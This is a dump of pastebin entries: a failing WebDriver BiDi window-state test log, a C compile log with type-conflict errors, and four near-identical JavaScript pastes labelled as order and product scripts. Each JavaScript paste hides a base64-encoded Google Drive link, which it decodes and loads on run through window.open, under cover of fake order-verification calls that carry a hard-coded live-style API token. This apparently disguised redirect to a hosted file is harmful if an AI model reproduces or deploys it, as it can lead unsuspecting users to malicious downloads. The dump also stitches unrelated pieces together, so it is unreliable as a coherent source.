            (""normal"", ""fullscreen""),
            (""normal"", ""maximized""),
            (""normal"", ""minimized""),
        ],
        ids=lambda states: f""{states[0]}-to-{states[1]}""
    )
    @pytest.mark.asyncio
    async def test_set_client_window_state_transitions(bidi_session, initial_state, target_state, first_window_id):
        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=initial_state
        )
        assert result[""state""] == initial_state

        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=target_state
        )
>       assert result[""state""] == target_state
E       AssertionError: assert 'minimized' == 'fullscreen'
E
E         - fullscreen
E         + minimized

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f30395e4910>
first_window_id = '67ede9e6-088a-406c-b250-f776ab19a496'
initial_state = 'minimized'
result     = {'active': True,
 'clientWindow': '67ede9e6-088a-406c-b250-f776ab19a496',
 'height': 600,
 'state': 'minimized',
 'width': 800,
 'x': 100,
 'y': 100}
target_state = 'fullscreen'

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/state.py:36: AssertionError
 1:24.15 INFO Got 3 unexpected results, with 0 unexpected passes
 1:24.15 wptserve INFO Stopped WebTransport over HTTP/3 server on 127.0.0.1:11000
 1:24.58 wptserve INFO Stopped http server on 127.0.0.1:8003
 1:24.58 wptserve INFO Stopped http server on 127.0.0.1:8002
 1:24.58 wptserve INFO Stopped http server on 127.0.0.1:8000
 1:24.58 wptserve INFO Stopped http server on 127.0.0.1:8001
 1:24.59 wptserve INFO Close on: (<AddressFamily.AF_INET: 2>, <SocketKind.SOCK_STREAM: 1>, 6, '', ('127.0.0.1', 8888))
 1:24.59 wptserve INFO Stopped http server on 127.0.0.1:8445
 1:24.59 wptserve INFO Stopped http server on 127.0.0.1:8444
 1:24.59 wptserve INFO Close on: (<AddressFamily.AF_INET: 2>, <SocketKind.SOCK_STREAM: 1>, 6, '', ('127.0.0.1', 8889))
 1:24.59 wptserve INFO Stopped http server on 127.0.0.1:9000
 1:24.61 wptserve INFO Stopped http server on 127.0.0.1:8446
 1:24.61 wptserve INFO Stopped http server on 127.0.0.1:8443
 1:24.83 INFO Removed font: Ahem.ttf
 1:24.88 INFO Closing logging queue
 1:24.88 INFO queue closed"
Mgvp3r6w,Order.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 08:00:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/43719/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tXmq30Lh,Untitled,dtorkin,C,Tuesday 8th of April 2025 07:52:51 AM CDT,"dtorkin@ubuntu1:~/Desktop/v0_11_2$ make
gcc -Wall -Wextra -g -Iprotocol -Iio -Isvm -Iuvm -Iconfig    -c -o svm/svm_main.o svm/svm_main.c
svm/svm_main.c: In function ‘main’:
svm/svm_main.c:32:19: warning: variable ‘clientAddressLength’ set but not used [-Wunused-but-set-variable]
   32 |         socklen_t clientAddressLength;
      |                   ^~~~~~~~~~~~~~~~~~~
gcc -Wall -Wextra -g -Iprotocol -Iio -Isvm -Iuvm -Iconfig    -c -o svm/svm_handlers.o svm/svm_handlers.c
svm/svm_handlers.c: In function ‘handle_prinyat_reper_message’:
svm/svm_handlers.c:204:52: warning: implicit declaration of function ‘ntohs’ [-Wimplicit-function-declaration]
  204 |         printf(""  Reper 1: NTSO=%u, R=%u, A=%u\n"", ntohs(body->NTSO1), ntohs(body->ReperR1), ntohs(body->ReperA1));
      |                                                    ^~~~~
gcc -Wall -Wextra -g -Iprotocol -Iio -Isvm -Iuvm -Iconfig    -c -o svm/svm_timers.o svm/svm_timers.c
gcc -Wall -Wextra -g -Iprotocol -Iio -Isvm -Iuvm -Iconfig    -c -o protocol/message_utils.o protocol/message_utils.c
gcc -Wall -Wextra -g -Iprotocol -Iio -Isvm -Iuvm -Iconfig    -c -o protocol/message_builder.o protocol/message_builder.c
gcc -Wall -Wextra -g -Iprotocol -Iio -Isvm -Iuvm -Iconfig    -c -o io/io_common.o io/io_common.c
io/io_common.c: In function ‘send_protocol_message’:
io/io_common.c:31:33: warning: implicit declaration of function ‘ntohs’ [-Wimplicit-function-declaration]
   31 |     uint16_t body_length_host = ntohs(body_length_net);
      |                                 ^~~~~
gcc -Wall -Wextra -g -Iprotocol -Iio -Isvm -Iuvm -Iconfig    -c -o io/io_ethernet.o io/io_ethernet.c
gcc -Wall -Wextra -g -Iprotocol -Iio -Isvm -Iuvm -Iconfig    -c -o config/config.o config/config.c
config/config.c: In function ‘load_config’:
config/config.c:85:61: warning: comparison is always false due to limited range of data type [-Wtype-limits]
   85 |     if (config->ethernet.port == 0 || config->ethernet.port > 65535) { // Проверка на 0 тоже полезна
      |                                                             ^
gcc -Wall -Wextra -g -Iprotocol -Iio -Isvm -Iuvm -Iconfig    -c -o config/ini.o config/ini.c
gcc -Wall -Wextra -g -Iprotocol -Iio -Isvm -Iuvm -Iconfig  svm/svm_main.o svm/svm_handlers.o svm/svm_timers.o protocol/message_utils.o protocol/message_builder.o io/io_common.o io/io_ethernet.o config/config.o config/ini.o -o svm_app -lrt
gcc -Wall -Wextra -g -Iprotocol -Iio -Isvm -Iuvm -Iconfig    -c -o uvm/uvm_main.o uvm/uvm_main.c
uvm/uvm_main.c: In function ‘main’:
uvm/uvm_main.c:104:82: warning: passing argument 1 of ‘send_init_channel_and_receive_confirm’ makes integer from pointer without a cast [-Wint-conversion]
  104 | itBody* confirmInitBody = send_init_channel_and_receive_confirm(io_uvm, &currentMessageCounter, &receivedMessage);
      |                                                                 ^~~~~~
      |                                                                 |
      |                                                                 IOInterface *

In file included from uvm/uvm_main.c:14:
uvm/uvm_comm.h:23:60: note: expected ‘int’ but argument is of type ‘IOInterface *’
   23 | ConfirmInitBody* send_init_channel_and_receive_confirm(int clientSocketFD, uint16_t *messageCounter, Message *receivedMessage);
      |                                                        ~~~~^~~~~~~~~~~~~~
uvm/uvm_main.c:111:113: warning: passing argument 1 of ‘send_provesti_kontrol_and_receive_podtverzhdenie’ makes integer from pointer without a cast [-Wint-conversion]
  111 | ontrolyaBody = send_provesti_kontrol_and_receive_podtverzhdenie(io_uvm, &currentMessageCounter, &receivedMessage, tk_request);
      |                                                                 ^~~~~~
      |                                                                 |
      |                                                                 IOInterface *

uvm/uvm_comm.h:34:83: note: expected ‘int’ but argument is of type ‘IOInterface *’
   34 | rolyaBody* send_provesti_kontrol_and_receive_podtverzhdenie(int clientSocketFD, uint16_t *messageCounter, Message *receivedMessage, uint8_t tk);
      |                                                             ~~~~^~~~~~~~~~~~~~

uvm/uvm_main.c:118:107: warning: passing argument 1 of ‘send_vydat_rezultaty_kontrolya_and_receive_rezultaty’ makes integer from pointer without a cast [-Wint-conversion]
  118 | olyaBody = send_vydat_rezultaty_kontrolya_and_receive_rezultaty(io_uvm, &currentMessageCounter, &receivedMessage, vpk_request);
      |                                                                 ^~~~~~
      |                                                                 |
      |                                                                 IOInterface *

uvm/uvm_comm.h:45:82: note: expected ‘int’ but argument is of type ‘IOInterface *’
   45 | aBody* send_vydat_rezultaty_kontrolya_and_receive_rezultaty(int clientSocketFD, uint16_t *messageCounter, Message *receivedMessage, uint8_t vpk);
      |                                                             ~~~~^~~~~~~~~~~~~~

uvm/uvm_main.c:124:99: warning: passing argument 1 of ‘send_vydat_sostoyanie_linii_and_receive_sostoyanie’ makes integer from pointer without a cast [-Wint-conversion]
  124 | eLiniiBody = send_vydat_sostoyanie_linii_and_receive_sostoyanie(io_uvm, &currentMessageCounter, &receivedMessage);
      |                                                                 ^~~~~~
      |                                                                 |
      |                                                                 IOInterface *

uvm/uvm_comm.h:55:77: note: expected ‘int’ but argument is of type ‘IOInterface *’
   55 | niiBody* send_vydat_sostoyanie_linii_and_receive_sostoyanie(int clientSocketFD, uint16_t *messageCounter, Message *receivedMessage);
      |                                                             ~~~~^~~~~~~~~~~~~~

uvm/uvm_main.c:142:59: warning: passing argument 1 of ‘send_prinyat_parametry_sdr’ makes integer from pointer without a cast [-Wint-conversion]
  142 |                 send_status |= send_prinyat_parametry_sdr(io_uvm, &currentMessageCounter);
      |                                                           ^~~~~~
      |                                                           |
      |                                                           IOInterface *
uvm/uvm_comm.h:90:36: note: expected ‘int’ but argument is of type ‘IOInterface *’
   90 | int send_prinyat_parametry_sdr(int clientSocketFD, uint16_t *messageCounter);
      |                                ~~~~^~~~~~~~~~~~~~
uvm/uvm_main.c:143:59: warning: passing argument 1 of ‘send_prinyat_parametry_tsd’ makes integer from pointer without a cast [-Wint-conversion]
  143 |                 send_status |= send_prinyat_parametry_tsd(io_uvm, &currentMessageCounter);
      |                                                           ^~~~~~
      |                                                           |
      |                                                           IOInterface *
uvm/uvm_comm.h:114:36: note: expected ‘int’ but argument is of type ‘IOInterface *’
  114 | int send_prinyat_parametry_tsd(int clientSocketFD, uint16_t *messageCounter);
      |                                ~~~~^~~~~~~~~~~~~~
uvm/uvm_main.c:144:59: warning: passing argument 1 of ‘send_navigatsionnye_dannye’ makes integer from pointer without a cast [-Wint-conversion]
  144 |                 send_status |= send_navigatsionnye_dannye(io_uvm, &currentMessageCounter);
      |                                                           ^~~~~~
      |                                                           |
      |                                                           IOInterface *
uvm/uvm_comm.h:122:36: note: expected ‘int’ but argument is of type ‘IOInterface *’
  122 | int send_navigatsionnye_dannye(int clientSocketFD, uint16_t *messageCounter);
      |                                ~~~~^~~~~~~~~~~~~~
uvm/uvm_main.c:147:58: warning: passing argument 1 of ‘send_prinyat_parametry_so’ makes integer from pointer without a cast [-Wint-conversion]
  147 |                 send_status |= send_prinyat_parametry_so(io_uvm, &currentMessageCounter);
      |                                                          ^~~~~~
      |                                                          |
      |                                                          IOInterface *
uvm/uvm_comm.h:66:35: note: expected ‘int’ but argument is of type ‘IOInterface *’
   66 | int send_prinyat_parametry_so(int clientSocketFD, uint16_t *messageCounter);
      |                               ~~~~^~~~~~~~~~~~~~
uvm/uvm_main.c:148:60: warning: passing argument 1 of ‘send_prinyat_parametry_3tso’ makes integer from pointer without a cast [-Wint-conversion]
  148 |                 send_status |= send_prinyat_parametry_3tso(io_uvm, &currentMessageCounter);
      |                                                            ^~~~~~
      |                                                            |
      |                                                            IOInterface *
uvm/uvm_comm.h:98:37: note: expected ‘int’ but argument is of type ‘IOInterface *’
   98 | int send_prinyat_parametry_3tso(int clientSocketFD, uint16_t *messageCounter);
      |                                 ~~~~^~~~~~~~~~~~~~
uvm/uvm_main.c:149:59: warning: passing argument 1 of ‘send_navigatsionnye_dannye’ makes integer from pointer without a cast [-Wint-conversion]
  149 |                 send_status |= send_navigatsionnye_dannye(io_uvm, &currentMessageCounter);
      |                                                           ^~~~~~
      |                                                           |
      |                                                           IOInterface *
uvm/uvm_comm.h:122:36: note: expected ‘int’ but argument is of type ‘IOInterface *’
  122 | int send_navigatsionnye_dannye(int clientSocketFD, uint16_t *messageCounter);
      |                                ~~~~^~~~~~~~~~~~~~
uvm/uvm_main.c:152:58: warning: passing argument 1 of ‘send_prinyat_parametry_so’ makes integer from pointer without a cast [-Wint-conversion]
  152 |                 send_status |= send_prinyat_parametry_so(io_uvm, &currentMessageCounter);
      |                                                          ^~~~~~
      |                                                          |
      |                                                          IOInterface *
uvm/uvm_comm.h:66:35: note: expected ‘int’ but argument is of type ‘IOInterface *’
   66 | int send_prinyat_parametry_so(int clientSocketFD, uint16_t *messageCounter);
      |                               ~~~~^~~~~~~~~~~~~~
uvm/uvm_main.c:153:60: warning: passing argument 1 of ‘send_prinyat_time_ref_range’ makes integer from pointer without a cast [-Wint-conversion]
  153 |                 send_status |= send_prinyat_time_ref_range(io_uvm, &currentMessageCounter);
      |                                                            ^~~~~~
      |                                                            |
      |                                                            IOInterface *
uvm/uvm_comm.h:74:37: note: expected ‘int’ but argument is of type ‘IOInterface *’
   74 | int send_prinyat_time_ref_range(int clientSocketFD, uint16_t *messageCounter);
      |                                 ~~~~^~~~~~~~~~~~~~
uvm/uvm_main.c:154:51: warning: passing argument 1 of ‘send_prinyat_reper’ makes integer from pointer without a cast [-Wint-conversion]
  154 |                 send_status |= send_prinyat_reper(io_uvm, &currentMessageCounter);
      |                                                   ^~~~~~
      |                                                   |
      |                                                   IOInterface *
uvm/uvm_comm.h:82:28: note: expected ‘int’ but argument is of type ‘IOInterface *’
   82 | int send_prinyat_reper(int clientSocketFD, uint16_t *messageCounter);
      |                        ~~~~^~~~~~~~~~~~~~
uvm/uvm_main.c:155:60: warning: passing argument 1 of ‘send_prinyat_parametry_3tso’ makes integer from pointer without a cast [-Wint-conversion]
  155 |                 send_status |= send_prinyat_parametry_3tso(io_uvm, &currentMessageCounter);
      |                                                            ^~~~~~
      |                                                            |
      |                                                            IOInterface *
uvm/uvm_comm.h:98:37: note: expected ‘int’ but argument is of type ‘IOInterface *’
   98 | int send_prinyat_parametry_3tso(int clientSocketFD, uint16_t *messageCounter);
      |                                 ~~~~^~~~~~~~~~~~~~
uvm/uvm_main.c:156:57: warning: passing argument 1 of ‘send_prinyat_ref_azimuth’ makes integer from pointer without a cast [-Wint-conversion]
  156 |                 send_status |= send_prinyat_ref_azimuth(io_uvm, &currentMessageCounter);
      |                                                         ^~~~~~
      |                                                         |
      |                                                         IOInterface *
uvm/uvm_comm.h:106:34: note: expected ‘int’ but argument is of type ‘IOInterface *’
  106 | int send_prinyat_ref_azimuth(int clientSocketFD, uint16_t *messageCounter);
      |                              ~~~~^~~~~~~~~~~~~~
uvm/uvm_main.c:157:59: warning: passing argument 1 of ‘send_navigatsionnye_dannye’ makes integer from pointer without a cast [-Wint-conversion]
  157 |                 send_status |= send_navigatsionnye_dannye(io_uvm, &currentMessageCounter);
      |                                                           ^~~~~~
      |                                                           |
      |                                                           IOInterface *
uvm/uvm_comm.h:122:36: note: expected ‘int’ but argument is of type ‘IOInterface *’
  122 | int send_navigatsionnye_dannye(int clientSocketFD, uint16_t *messageCounter);
      |                                ~~~~^~~~~~~~~~~~~~
gcc -Wall -Wextra -g -Iprotocol -Iio -Isvm -Iuvm -Iconfig    -c -o uvm/uvm_comm.o uvm/uvm_comm.c
uvm/uvm_comm.c:21:18: error: conflicting types for ‘send_init_channel_and_receive_confirm’; have ‘ConfirmInitBody *(IOInterface *, uint16_t *, Message *)’ {aka ‘ConfirmInitBody *(IOInterface *, short unsigned int *, Message *)’}
   21 | ConfirmInitBody* send_init_channel_and_receive_confirm(IOInterface *io, uint16_t *messageCounter, Message *receivedMessage) {
      |                  ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
In file included from uvm/uvm_comm.c:8:
uvm/uvm_comm.h:23:18: note: previous declaration of ‘send_init_channel_and_receive_confirm’ with type ‘ConfirmInitBody *(int,  uint16_t *, Message *)’ {aka ‘ConfirmInitBody *(int,  short unsigned int *, Message *)’}
   23 | ConfirmInitBody* send_init_channel_and_receive_confirm(int clientSocketFD, uint16_t *messageCounter, Message *receivedMessage);
      |                  ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.c:46:30: error: conflicting types for ‘send_provesti_kontrol_and_receive_podtverzhdenie’; have ‘PodtverzhdenieKontrolyaBody *(IOInterface *, uint16_t *, Message *, uint8_t)’ {aka ‘PodtverzhdenieKontrolyaBody *(IOInterface *, short unsigned int *, Message *, unsigned char)’}
   46 | PodtverzhdenieKontrolyaBody* send_provesti_kontrol_and_receive_podtverzhdenie(IOInterface *io, uint16_t *messageCounter, Message *receivedMessage, uint8_t tk) {
      |                              ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.h:34:30: note: previous declaration of ‘send_provesti_kontrol_and_receive_podtverzhdenie’ with type ‘PodtverzhdenieKontrolyaBody *(int,  uint16_t *, Message *, uint8_t)’ {aka ‘PodtverzhdenieKontrolyaBody *(int,  short unsigned int *, Message *, unsigned char)’}
   34 | PodtverzhdenieKontrolyaBody* send_provesti_kontrol_and_receive_podtverzhdenie(int clientSocketFD, uint16_t *messageCounter, Message *receivedMessage, uint8_t tk);
      |                              ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.c:72:25: error: conflicting types for ‘send_vydat_rezultaty_kontrolya_and_receive_rezultaty’; have ‘RezultatyKontrolyaBody *(IOInterface *, uint16_t *, Message *, uint8_t)’ {aka ‘RezultatyKontrolyaBody *(IOInterface *, short unsigned int *, Message *, unsigned char)’}
   72 | RezultatyKontrolyaBody* send_vydat_rezultaty_kontrolya_and_receive_rezultaty(IOInterface *io, uint16_t *messageCounter, Message *receivedMessage, uint8_t vpk) {
      |                         ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.h:45:25: note: previous declaration of ‘send_vydat_rezultaty_kontrolya_and_receive_rezultaty’ with type ‘RezultatyKontrolyaBody *(int,  uint16_t *, Message *, uint8_t)’ {aka ‘RezultatyKontrolyaBody *(int,  short unsigned int *, Message *, unsigned char)’}
   45 | RezultatyKontrolyaBody* send_vydat_rezultaty_kontrolya_and_receive_rezultaty(int clientSocketFD, uint16_t *messageCounter, Message *receivedMessage, uint8_t vpk);
      |                         ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.c:98:22: error: conflicting types for ‘send_vydat_sostoyanie_linii_and_receive_sostoyanie’; have ‘SostoyanieLiniiBody *(IOInterface *, uint16_t *, Message *)’ {aka ‘SostoyanieLiniiBody *(IOInterface *, short unsigned int *, Message *)’}
   98 | SostoyanieLiniiBody* send_vydat_sostoyanie_linii_and_receive_sostoyanie(IOInterface *io, uint16_t *messageCounter, Message *receivedMessage) {
      |                      ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.h:55:22: note: previous declaration of ‘send_vydat_sostoyanie_linii_and_receive_sostoyanie’ with type ‘SostoyanieLiniiBody *(int,  uint16_t *, Message *)’ {aka ‘SostoyanieLiniiBody *(int,  short unsigned int *, Message *)’}
   55 | SostoyanieLiniiBody* send_vydat_sostoyanie_linii_and_receive_sostoyanie(int clientSocketFD, uint16_t *messageCounter, Message *receivedMessage);
      |                      ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.c:126:5: error: conflicting types for ‘send_prinyat_parametry_so’; have ‘int(IOInterface *, uint16_t *)’ {aka ‘int(IOInterface *, short unsigned int *)’}
  126 | int send_prinyat_parametry_so(IOInterface *io, uint16_t *messageCounter) {
      |     ^~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.h:66:5: note: previous declaration of ‘send_prinyat_parametry_so’ with type ‘int(int,  uint16_t *)’ {aka ‘int(int,  short unsigned int *)’}
   66 | int send_prinyat_parametry_so(int clientSocketFD, uint16_t *messageCounter);
      |     ^~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.c:143:5: error: conflicting types for ‘send_prinyat_time_ref_range’; have ‘int(IOInterface *, uint16_t *)’ {aka ‘int(IOInterface *, short unsigned int *)’}
  143 | int send_prinyat_time_ref_range(IOInterface *io, uint16_t *messageCounter) {
      |     ^~~~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.h:74:5: note: previous declaration of ‘send_prinyat_time_ref_range’ with type ‘int(int,  uint16_t *)’ {aka ‘int(int,  short unsigned int *)’}
   74 | int send_prinyat_time_ref_range(int clientSocketFD, uint16_t *messageCounter);
      |     ^~~~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.c:160:5: error: conflicting types for ‘send_prinyat_reper’; have ‘int(IOInterface *, uint16_t *)’ {aka ‘int(IOInterface *, short unsigned int *)’}
  160 | int send_prinyat_reper(IOInterface *io, uint16_t *messageCounter) {
      |     ^~~~~~~~~~~~~~~~~~
uvm/uvm_comm.h:82:5: note: previous declaration of ‘send_prinyat_reper’ with type ‘int(int,  uint16_t *)’ {aka ‘int(int,  short unsigned int *)’}
   82 | int send_prinyat_reper(int clientSocketFD, uint16_t *messageCounter);
      |     ^~~~~~~~~~~~~~~~~~
uvm/uvm_comm.c:177:5: error: conflicting types for ‘send_prinyat_parametry_sdr’; have ‘int(IOInterface *, uint16_t *)’ {aka ‘int(IOInterface *, short unsigned int *)’}
  177 | int send_prinyat_parametry_sdr(IOInterface *io, uint16_t *messageCounter) {
      |     ^~~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.h:90:5: note: previous declaration of ‘send_prinyat_parametry_sdr’ with type ‘int(int,  uint16_t *)’ {aka ‘int(int,  short unsigned int *)’}
   90 | int send_prinyat_parametry_sdr(int clientSocketFD, uint16_t *messageCounter);
      |     ^~~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.c:198:5: error: conflicting types for ‘send_prinyat_parametry_3tso’; have ‘int(IOInterface *, uint16_t *)’ {aka ‘int(IOInterface *, short unsigned int *)’}
  198 | int send_prinyat_parametry_3tso(IOInterface *io, uint16_t *messageCounter) {
      |     ^~~~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.h:98:5: note: previous declaration of ‘send_prinyat_parametry_3tso’ with type ‘int(int,  uint16_t *)’ {aka ‘int(int,  short unsigned int *)’}
   98 | int send_prinyat_parametry_3tso(int clientSocketFD, uint16_t *messageCounter);
      |     ^~~~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.c:215:5: error: conflicting types for ‘send_prinyat_ref_azimuth’; have ‘int(IOInterface *, uint16_t *)’ {aka ‘int(IOInterface *, short unsigned int *)’}
  215 | int send_prinyat_ref_azimuth(IOInterface *io, uint16_t *messageCounter) {
      |     ^~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.h:106:5: note: previous declaration of ‘send_prinyat_ref_azimuth’ with type ‘int(int,  uint16_t *)’ {aka ‘int(int,  short unsigned int *)’}
  106 | int send_prinyat_ref_azimuth(int clientSocketFD, uint16_t *messageCounter);
      |     ^~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.c:232:5: error: conflicting types for ‘send_prinyat_parametry_tsd’; have ‘int(IOInterface *, uint16_t *)’ {aka ‘int(IOInterface *, short unsigned int *)’}
  232 | int send_prinyat_parametry_tsd(IOInterface *io, uint16_t *messageCounter) {
      |     ^~~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.h:114:5: note: previous declaration of ‘send_prinyat_parametry_tsd’ with type ‘int(int,  uint16_t *)’ {aka ‘int(int,  short unsigned int *)’}
  114 | int send_prinyat_parametry_tsd(int clientSocketFD, uint16_t *messageCounter);
      |     ^~~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.c:252:5: error: conflicting types for ‘send_navigatsionnye_dannye’; have ‘int(IOInterface *, uint16_t *)’ {aka ‘int(IOInterface *, short unsigned int *)’}
  252 | int send_navigatsionnye_dannye(IOInterface *io, uint16_t *messageCounter) {
      |     ^~~~~~~~~~~~~~~~~~~~~~~~~~
uvm/uvm_comm.h:122:5: note: previous declaration of ‘send_navigatsionnye_dannye’ with type ‘int(int,  uint16_t *)’ {aka ‘int(int,  short unsigned int *)’}
  122 | int send_navigatsionnye_dannye(int clientSocketFD, uint16_t *messageCounter);
      |     ^~~~~~~~~~~~~~~~~~~~~~~~~~
make: *** [<встроенное>: uvm/uvm_comm.o] Ошибка 1
dtorkin@ubuntu1:~/Desktop/v0_11_2$"
vkTKQWgM,Market.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 07:45:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56624/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mjUfpRd5,Untitled,Epiphemeral,JavaScript,Tuesday 8th of April 2025 07:29:37 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47401/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
QhhZjtrS,Products.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 07:14:15 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/36213/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
